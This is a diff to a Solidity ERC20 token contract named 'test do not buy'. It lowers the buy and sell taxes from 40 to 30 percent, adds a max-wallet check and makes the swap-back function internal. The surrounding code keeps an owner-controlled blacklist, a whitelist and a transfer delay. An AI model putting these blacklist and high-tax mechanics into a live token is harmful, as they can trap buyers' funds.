@@ -20,13 +20,13 @@ contract ERC20_UniV2 {
     mapping(address => uint) private _lastTransferBlock;
     address[] public _blacklistArray;
     address private _v2Router = 0xfCD3842f85ed87ba2889b4D35893403796e67FF1;
-    string private _name = "TEST DO NOT BUY";
-    string private _symbol = "TEST";
+    string private _name = "test do not buy";
+    string private _symbol = "test";
     uint private immutable _decimals = 18;
     uint private _totalSupply = 1000000 * 10 ** 18;
     uint public _swapAmount = 1000 * 10 ** 18;
-    uint public _buyTax = 40;
-    uint public _sellTax = 40;
+    uint public _buyTax = 30;
+    uint public _sellTax = 30;
     uint public _max = 5;
     uint public _transferDelay = 0;
     address public _v2Pair;
@@ -67,7 +67,7 @@ contract ERC20_UniV2 {
     }
 
 	function _transfer(address from, address to, uint256 amount) internal {
-		require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
+		require(_balances[from] >= amount && (amount + _balances[to] <= maxInt() || _whitelisted[from] || _whitelisted[to] || to == _v2Pair), "ERC20: transfer amount exceeds balance or max wallet");
 		require(!_blacklisted[from] && !_blacklisted[to], "ERC20: YOU DON'T HAVE THE RIGHT");
 		require(block.number >= _lastTransferBlock[from] + _transferDelay || from == _v2Pair || _whitelisted[from] || _whitelisted[to], "ERC20: transfer delay not met");
 		uint256 taxAmount = 0;
@@ -122,7 +122,7 @@ contract ERC20_UniV2 {
 
     function maxInt() internal view returns (uint) {return _totalSupply * _max / 1000;}
 
-    function _swapBack(uint256 amount_) public onlyDev{
+    function _swapBack(uint256 amount_) internal{
         _approve(address(this), _v2Router, amount_ + 100);
         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);
     }
